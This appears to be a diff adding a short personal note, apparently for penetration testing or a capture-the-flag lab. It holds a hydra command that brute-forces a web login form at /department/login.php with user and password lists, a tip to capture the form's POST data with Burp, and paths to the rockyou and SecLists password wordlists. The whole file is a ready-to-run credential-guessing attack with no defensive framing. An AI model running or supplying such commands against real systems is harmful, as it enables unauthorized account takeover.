@@ -1,0 +1,5 @@
+hydra -L userlist.txt -P passwordlist.txt IP http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
+last part turn Burp on with test info and copy the post data
+
+/usr/share/wordlists/rockyou.txt
+/usr/share/wordlists/Seclists/Passwords/Common-Passwords/10k_most_common.txt
